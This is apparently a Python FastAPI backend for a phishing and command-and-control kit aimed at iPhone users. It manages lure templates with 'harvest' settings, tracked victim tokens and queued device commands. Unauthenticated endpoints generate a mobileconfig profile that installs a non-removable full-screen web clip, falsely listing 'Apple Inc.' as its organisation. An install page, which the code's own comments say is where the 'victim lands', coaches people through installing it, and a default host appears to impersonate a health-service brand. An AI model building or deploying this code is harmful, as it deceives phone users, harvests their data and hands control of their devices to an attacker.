import json, secrets, asyncio
from datetime import datetime
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse, Response
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update
from backend.database import get_db
from backend.auth import get_current_user
from backend.models import WcTemplate, WcTarget, WcFlow, WcFlowRun, Device, Command

router = APIRouter(prefix="/wc", tags=["studio"])

# ---------------------------------------------------------------------------
# Templates CRUD
# ---------------------------------------------------------------------------

@router.get("/templates")
async def list_templates(db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcTemplate).order_by(WcTemplate.id))
    rows = result.scalars().all()
    return [_tmpl_summary(t) for t in rows]

@router.post("/templates")
async def create_template(body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    t = WcTemplate(name=body.get("name", "New Template"))
    db.add(t)
    await db.commit()
    await db.refresh(t)
    return _tmpl_full(t)

@router.get("/templates/{tid}")
async def get_template(tid: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    t = await _get_tmpl(tid, db)
    return _tmpl_full(t)

@router.put("/templates/{tid}")
async def update_template(tid: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    t = await _get_tmpl(tid, db)
    fields = ["name","description","app_name","app_icon_b64","ui_type","ui_html",
              "theme_json","splash_json","install_page_json","onboarding_json","harvest_json"]
    for f in fields:
        if f in body:
            val = body[f]
            # JSON fields: accept dict/list, serialize
            if f.endswith("_json") and not isinstance(val, str):
                val = json.dumps(val)
            setattr(t, f, val)
    t.updated_at = datetime.utcnow()
    await db.commit()
    return _tmpl_full(t)

@router.delete("/templates/{tid}")
async def delete_template(tid: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    t = await _get_tmpl(tid, db)
    await db.delete(t)
    await db.commit()
    return {"ok": True}

@router.post("/templates/{tid}/set-default")
async def set_default(tid: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    await _get_tmpl(tid, db)
    await db.execute(update(WcTemplate).values(is_default=False))
    await db.execute(update(WcTemplate).where(WcTemplate.id == tid).values(is_default=True))
    await db.commit()
    return {"ok": True}

@router.post("/templates/{tid}/duplicate")
async def duplicate_template(tid: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    src = await _get_tmpl(tid, db)
    dup = WcTemplate(
        name=src.name + " (copy)", description=src.description,
        app_name=src.app_name, app_icon_b64=src.app_icon_b64,
        ui_type=src.ui_type, ui_html=src.ui_html, theme_json=src.theme_json,
        splash_json=src.splash_json, install_page_json=src.install_page_json,
        onboarding_json=src.onboarding_json, harvest_json=src.harvest_json,
    )
    db.add(dup)
    await db.commit()
    await db.refresh(dup)
    return _tmpl_full(dup)

# ---------------------------------------------------------------------------
# Targets CRUD
# ---------------------------------------------------------------------------

@router.get("/targets")
async def list_targets(db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcTarget).order_by(WcTarget.id.desc()))
    rows = result.scalars().all()
    return [_target_dict(r) for r in rows]

@router.post("/targets")
async def create_target(body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    token = secrets.token_urlsafe(16)
    t = WcTarget(
        token=token,
        label=body.get("label", "Target"),
        template_id=body.get("template_id"),
    )
    db.add(t)
    await db.commit()
    await db.refresh(t)
    return _target_dict(t)

@router.patch("/targets/{tid}")
async def update_target(tid: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcTarget).where(WcTarget.id == tid))
    t = result.scalar_one_or_none()
    if not t:
        raise HTTPException(404, "not_found")
    for f in ("label", "template_id", "device_id"):
        if f in body:
            setattr(t, f, body[f])
    await db.commit()
    return _target_dict(t)

@router.delete("/targets/{tid}")
async def delete_target(tid: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcTarget).where(WcTarget.id == tid))
    t = result.scalar_one_or_none()
    if not t:
        raise HTTPException(404, "not_found")
    await db.delete(t)
    await db.commit()
    return {"ok": True}

# ---------------------------------------------------------------------------
# Flows CRUD
# ---------------------------------------------------------------------------

@router.get("/flows")
async def list_flows(db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcFlow).order_by(WcFlow.id))
    rows = result.scalars().all()
    return [{"id": f.id, "name": f.name, "description": f.description,
             "steps": _json(f.steps_json), "created_at": _ts(f.created_at)} for f in rows]

@router.post("/flows")
async def create_flow(body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    f = WcFlow(name=body.get("name", "New Flow"), description=body.get("description"),
               steps_json=json.dumps(body.get("steps", [])))
    db.add(f)
    await db.commit()
    await db.refresh(f)
    return {"id": f.id, "name": f.name}

@router.put("/flows/{fid}")
async def update_flow(fid: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcFlow).where(WcFlow.id == fid))
    f = result.scalar_one_or_none()
    if not f:
        raise HTTPException(404, "not_found")
    if "name" in body: f.name = body["name"]
    if "description" in body: f.description = body["description"]
    if "steps" in body: f.steps_json = json.dumps(body["steps"])
    await db.commit()
    return {"ok": True}

@router.delete("/flows/{fid}")
async def delete_flow(fid: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcFlow).where(WcFlow.id == fid))
    f = result.scalar_one_or_none()
    if not f:
        raise HTTPException(404, "not_found")
    await db.delete(f)
    await db.commit()
    return {"ok": True}

@router.post("/flows/{fid}/run/{device_id}")
async def run_flow(fid: int, device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(WcFlow).where(WcFlow.id == fid))
    flow = result.scalar_one_or_none()
    if not flow:
        raise HTTPException(404, "flow_not_found")
    steps = _json(flow.steps_json)
    if not steps:
        return {"ok": True, "commands_queued": 0}
    # Queue each step as a command with accumulated delay stored in created_at offset
    # (simple approach: queue all commands immediately, device processes them in order)
    queued = 0
    for step in steps:
        cmd = Command(
            device_id=device_id,
            type=step.get("command", "ping"),
            payload_json=json.dumps(step.get("payload", {})),
            status="pending",
        )
        db.add(cmd)
        queued += 1
    run = WcFlowRun(flow_id=fid, device_id=device_id, status="running",
                    current_step=0)
    db.add(run)
    await db.commit()
    return {"ok": True, "commands_queued": queued}

# ---------------------------------------------------------------------------
# WebClip persona endpoint (NO auth — called by device)
# ---------------------------------------------------------------------------

@router.get("/persona")
async def get_persona(request: Request, db: AsyncSession = Depends(get_db)):
    """WebClip calls this on startup to get its UI config."""
    token = request.query_params.get("t")
    device_id = request.query_params.get("d")
    template = None

    if token:
        result = await db.execute(select(WcTarget).where(WcTarget.token == token))
        target = result.scalar_one_or_none()
        if target:
            # Update first_seen
            from datetime import datetime
            if not target.first_seen:
                target.first_seen = datetime.utcnow()
                await db.commit()
            if target.template_id:
                r2 = await db.execute(select(WcTemplate).where(WcTemplate.id == target.template_id))
                template = r2.scalar_one_or_none()

    if not template and device_id:
        # Look up device's target
        r2 = await db.execute(select(WcTarget).where(WcTarget.device_id == int(device_id)))
        target = r2.scalar_one_or_none()
        if target and target.template_id:
            r3 = await db.execute(select(WcTemplate).where(WcTemplate.id == target.template_id))
            template = r3.scalar_one_or_none()

    if not template:
        # Fall back to default template
        r2 = await db.execute(select(WcTemplate).where(WcTemplate.is_default == True).limit(1))
        template = r2.scalar_one_or_none()

    if not template:
        return {"ui_type": "white"}

    return {
        "ui_type": template.ui_type,
        "ui_html": template.ui_html,
        "app_name": template.app_name,
        "theme": _json(template.theme_json),
        "splash": _json(template.splash_json),
        "onboarding": _json(template.onboarding_json),
        "harvest": _json(template.harvest_json),
    }

# ---------------------------------------------------------------------------
# Token link — device calls this on first load to link token -> device_id
# ---------------------------------------------------------------------------

@router.post("/link-token")
async def link_token(body: dict, db: AsyncSession = Depends(get_db)):
    token = body.get("token")
    device_id = body.get("device_id")
    if not token or not device_id:
        return {"ok": False}
    result = await db.execute(select(WcTarget).where(WcTarget.token == token))
    target = result.scalar_one_or_none()
    if target and not target.device_id:
        target.device_id = device_id
        from datetime import datetime
        target.first_seen = datetime.utcnow()
        await db.commit()
    return {"ok": True}

# ---------------------------------------------------------------------------
# Dynamic mobileconfig endpoint (NO auth — victim downloads this)
# ---------------------------------------------------------------------------

@router.get("/mobileconfig")
async def get_mobileconfig(request: Request, db: AsyncSession = Depends(get_db)):
    token = request.query_params.get("t", "")
    template = None
    app_name = "App"

    if token:
        result = await db.execute(select(WcTarget).where(WcTarget.token == token))
        target = result.scalar_one_or_none()
        if target and target.template_id:
            r2 = await db.execute(select(WcTemplate).where(WcTemplate.id == target.template_id))
            template = r2.scalar_one_or_none()

    if not template:
        r2 = await db.execute(select(WcTemplate).where(WcTemplate.is_default == True).limit(1))
        template = r2.scalar_one_or_none()

    if template:
        app_name = template.app_name or "App"

    # Build the WebClip URL with the token
    host = request.headers.get("host", "clipper.clalitapp.info")
    scheme = "https"
    wc_url = f"{scheme}://{host}/"
    if token:
        wc_url += f"?t={token}"

    import uuid
    uid = str(uuid.uuid4()).upper()
    plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>FullScreen</key>
      <true/>
      <key>IsRemovable</key>
      <false/>
      <key>Label</key>
      <string>{app_name}</string>
      <key>PayloadDescription</key>
      <string>WebClip shortcut</string>
      <key>PayloadDisplayName</key>
      <string>{app_name}</string>
      <key>PayloadIdentifier</key>
      <string>com.webclip.c2.clip.{uid.lower()}</string>
      <key>PayloadType</key>
      <string>com.apple.webClip.managed</string>
      <key>PayloadUUID</key>
      <string>{uid}</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>Precomposed</key>
      <true/>
      <key>URL</key>
      <string>{wc_url}</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Installs {app_name} shortcut on home screen</string>
  <key>PayloadDisplayName</key>
  <string>{app_name}</string>
  <key>PayloadIdentifier</key>
  <string>com.webclip.c2.profile.{uid.lower()}</string>
  <key>PayloadOrganization</key>
  <string>Apple Inc.</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>{uid}</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</dict>
</plist>"""
    return Response(
        content=plist,
        media_type="application/x-apple-aspen-config",
        headers={"Content-Disposition": f'attachment; filename="install.mobileconfig"'}
    )

# ---------------------------------------------------------------------------
# Install page (victim lands here to download profile)
# ---------------------------------------------------------------------------

@router.get("/install/{token}", response_class=HTMLResponse)
async def install_page(token: str, db: AsyncSession = Depends(get_db)):
    template = None
    result = await db.execute(select(WcTarget).where(WcTarget.token == token))
    target = result.scalar_one_or_none()
    if target and target.template_id:
        r2 = await db.execute(select(WcTemplate).where(WcTemplate.id == target.template_id))
        template = r2.scalar_one_or_none()

    cfg = {}
    app_name = "App"
    if template:
        cfg = _json(template.install_page_json)
        app_name = template.app_name or "App"

    title = cfg.get("title", "Install App")
    body_text = cfg.get("body", "Tap the button below to install the app on your device.")
    btn_label = cfg.get("btn_label", "Install")
    bg = cfg.get("bg", "#f2f2f7")
    accent = cfg.get("accent", "#007aff")
    logo_b64 = template.app_icon_b64 if template else None

    if logo_b64:
        logo_html = f'<img src="{logo_b64}" style="width:80px;height:80px;border-radius:18px;margin-bottom:16px;" alt="icon">'
    else:
        logo_html = f'<div style="width:80px;height:80px;border-radius:18px;background:{accent};display:flex;align-items:center;justify-content:center;margin-bottom:16px;font-size:32px;color:#fff;">&#9632;</div>'

    return f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>{title}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}}
body{{min-height:100vh;background:{bg};font-family:-apple-system,'SF Pro Text','Helvetica Neue',sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 20px;}}
.card{{background:#fff;border-radius:20px;padding:32px 24px;max-width:380px;width:100%;text-align:center;box-shadow:0 4px 32px rgba(0,0,0,.08);}}
.logo{{display:flex;justify-content:center;}}
h1{{font-size:22px;font-weight:700;color:#1c1c1e;margin-bottom:10px;}}
p{{font-size:15px;color:#6e6e73;line-height:1.5;margin-bottom:28px;}}
.btn{{display:block;width:100%;padding:16px;background:{accent};color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:600;text-decoration:none;cursor:pointer;-webkit-appearance:none;}}
.btn:active{{opacity:.85;}}
.note{{font-size:12px;color:#aeaeb2;margin-top:16px;line-height:1.4;}}
</style></head><body>
<div class="card">
  <div class="logo">{logo_html}</div>
  <h1>{title}</h1>
  <p>{body_text}</p>
  <a class="btn" href="/api/wc/mobileconfig?t={token}">{btn_label}</a>
  <div class="note">After tapping, open <b>Settings &rarr; General &rarr; VPN &amp; Device Management</b> and install the profile.</div>
</div>
</body></html>"""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _json(s):
    try:
        return json.loads(s) if s else {}
    except Exception:
        return {}

def _ts(dt):
    return dt.isoformat() if dt else None

def _tmpl_summary(t: WcTemplate):
    return {"id": t.id, "name": t.name, "is_default": t.is_default,
            "ui_type": t.ui_type, "app_name": t.app_name,
            "created_at": _ts(t.created_at), "updated_at": _ts(t.updated_at)}

def _tmpl_full(t: WcTemplate):
    return {
        "id": t.id, "name": t.name, "description": t.description,
        "is_default": t.is_default, "app_name": t.app_name,
        "app_icon_b64": t.app_icon_b64, "ui_type": t.ui_type, "ui_html": t.ui_html,
        "theme": _json(t.theme_json), "splash": _json(t.splash_json),
        "install_page": _json(t.install_page_json),
        "onboarding": _json(t.onboarding_json), "harvest": _json(t.harvest_json),
        "created_at": _ts(t.created_at), "updated_at": _ts(t.updated_at),
    }

def _target_dict(t: WcTarget):
    return {"id": t.id, "token": t.token, "label": t.label,
            "template_id": t.template_id, "device_id": t.device_id,
            "first_seen": _ts(t.first_seen), "created_at": _ts(t.created_at)}

async def _get_tmpl(tid: int, db: AsyncSession) -> WcTemplate:
    result = await db.execute(select(WcTemplate).where(WcTemplate.id == tid))
    t = result.scalar_one_or_none()
    if not t:
        raise HTTPException(404, "template_not_found")
    return t
